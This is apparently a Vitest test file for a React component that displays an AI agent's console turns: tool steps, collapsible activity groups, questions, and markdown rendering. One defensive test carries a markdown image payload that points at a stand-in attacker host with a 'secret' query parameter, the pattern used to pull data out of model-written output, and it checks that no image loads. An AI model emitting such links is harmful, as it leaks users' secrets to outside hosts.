import { describe, it, expect, vi } from "vitest";
import { render, screen, fireEvent } from "src/utils/test-utils";

import { Turn } from "../ConsoleTurn";

const builder = (steps) => ({ id: "t1", role: "builder", steps });

describe("ConsoleTurn new step kinds", () => {
  it("renders a running tool row with an ellipsis and a completed one with its result", () => {
    render(<Turn turn={builder([
      { id: "s1", kind: "tool", label: "Read", state: "running" },
      { id: "s2", kind: "tool", label: "Write", state: "completed", result: "42 lines" },
    ])} />);
    expect(screen.getByText("Read")).toBeInTheDocument();
    expect(screen.getByText("…")).toBeInTheDocument();
    expect(screen.getByText("42 lines")).toBeInTheDocument();
  });

  it("renders an interrupted tool as finalized — its result, not the pulsing ellipsis", () => {
    // A tool that never finished (the run stopped): it must read as done, not as
    // a still-running (pulsing "…") row.
    render(<Turn turn={builder([
      { id: "s1", kind: "tool", label: "read run", state: "interrupted", result: "Didn't finish" },
    ])} />);
    expect(screen.getByText("read run")).toBeInTheDocument();
    expect(screen.getByText("Didn't finish")).toBeInTheDocument();
    expect(screen.queryByText("…")).toBeNull();
  });

  it("folds activity into a collapsible 'Run activity · N updates' group", () => {
    render(<Turn turn={builder([
      { id: "g1", kind: "group", count: 2, lines: ["scanning tests", "ALK moved to Build"] },
    ])} />);
    const header = screen.getByText("Run activity · 2 updates");
    expect(header).toBeInTheDocument();
    // collapsed by default
    expect(screen.queryByText("scanning tests")).toBeNull();
    fireEvent.click(header);
    expect(screen.getByText("scanning tests")).toBeInTheDocument();
    expect(screen.getByText("ALK moved to Build")).toBeInTheDocument();
  });

  it("renders error and cancelled steps", () => {
    render(<Turn turn={builder([
      { id: "e1", kind: "error", text: "It broke" },
      { id: "c1", kind: "cancelled", text: "Stopped." },
    ])} />);
    expect(screen.getByText("It broke")).toBeInTheDocument();
    expect(screen.getByText("Stopped.")).toBeInTheDocument();
  });

  it("renders a Rebuild's opening line as a step kind it knows", () => {
    const error = vi.spyOn(console, "error").mockImplementation(() => {});
    try {
      render(
        <Turn
          turn={builder([
            {
              id: "l1",
              kind: "nudge-line",
              text: "Updating the environment for agent v3…",
            },
          ])}
        />,
      );
      expect(
        screen.getByText("Updating the environment for agent v3…"),
      ).toBeInTheDocument();
      expect(error).not.toHaveBeenCalled();
    } finally {
      error.mockRestore();
    }
  });

  it("renders a markdown note", () => {
    render(<Turn turn={builder([{ id: "n1", kind: "note", markdown: true, text: "**bold** move" }])} />);
    expect(screen.getByText("bold")).toBeInTheDocument();
  });

  it("wires an unresolved ask and shows a resolved summary from props", () => {
    const onSubmit = vi.fn();
    const question = { prompt: "How strict?", options: [{ label: "Strict" }], multiSelect: false, step: 1, total: 1 };
    const { rerender } = render(
      <Turn turn={builder([{ id: "a1", kind: "ask", question, onSubmit }])} />,
    );
    // Skip is hidden when no onSkip handler is provided (a blocking question).
    expect(screen.queryByRole("button", { name: "Skip" })).toBeNull();
    fireEvent.click(screen.getByText("Strict"));
    fireEvent.click(screen.getByRole("button", { name: "Submit" }));
    expect(onSubmit).toHaveBeenCalledWith(["Strict"]);

    rerender(
      <Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Strict" }])} />,
    );
    // Resolved summary renders the answer verbatim and no Submit control.
    expect(screen.queryByRole("button", { name: "Submit" })).toBeNull();
    expect(screen.getAllByText("Strict").length).toBeGreaterThan(0);
  });

  it.each([
    "Send it to <reservation_id> at the <front desk>?",
    "Use _private_field or __init__ here? Also 2*3*4 and C:\\temp\\new.",
    "# of rooms to hold back?",
    "1. Should we keep this rule?",
    "How should holds work?\n# of rooms per booking: 3",
    "Rename `x` to __init__ or 2*3*4?",
  ])("shows a plain question exactly as written: %s", (prompt) => {
    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
    const { container } = render(
      <Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />,
    );
    expect(container.textContent).toContain(prompt);
  });

  it("never loads an image from model-written markdown", () => {
    const text = "Done.\n\n![x](https://attacker.example/p.png?d=secret)";
    const { container } = render(<Turn turn={builder([{ id: "n1", kind: "note", text, markdown: true }])} />);
    expect(screen.getByText("Done.")).toBeInTheDocument();
    expect(container.querySelector("img")).toBeNull();
  });

  it.each([
    ["with outer pipes", "Pick one:\n\n| Rate | Refund |\n|---|---|\n| Flexible | Yes |"],
    ["without outer pipes", "Pick one:\n\nRate | Refund\n---|:--:\nFlexible | Yes"],
    ["with no blank line above", "Pick one:\n| Rate | Refund |\n|---|---|\n| Flexible | Yes |"],
  ])("renders a question that is only a table: %s", (_, prompt) => {
    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
    render(<Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />);
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "Flexible" })).toBeInTheDocument();
  });

  it("keeps a plain question with pipes as written", () => {
    const prompt = "Use a | b or c?\nThe --- divider stays too.";
    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
    const { container } = render(
      <Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />,
    );
    expect(container.querySelector("table")).toBeNull();
    expect(container).toHaveTextContent("Use a | b or c?");
    expect(container).toHaveTextContent("The --- divider stays too.");
  });

  it("keeps raw angle brackets inside a markdown question", () => {
    const prompt = "Approve this?\n\n### Routing\n\n- send it to the <front desk>";
    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
    render(<Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />);
    expect(screen.getByRole("listitem")).toHaveTextContent("send it to the <front desk>");
  });

  it("renders a question's markdown, both open and answered", () => {
    const prompt = "Approve this design?\n\n### Tools\n\n- **check_availability** reads rooms";
    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
    const expectRendered = () => {
      expect(screen.getByRole("heading", { name: "Tools" })).toBeInTheDocument();
      expect(screen.getByRole("listitem")).toHaveTextContent("check_availability reads rooms");
      expect(screen.queryByText(/###|\*\*/)).toBeNull();
    };
    const { rerender } = render(<Turn turn={builder([{ id: "a1", kind: "ask", question, onSubmit: vi.fn() }])} />);
    expectRendered();

    rerender(<Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />);
    expectRendered();
  });
});
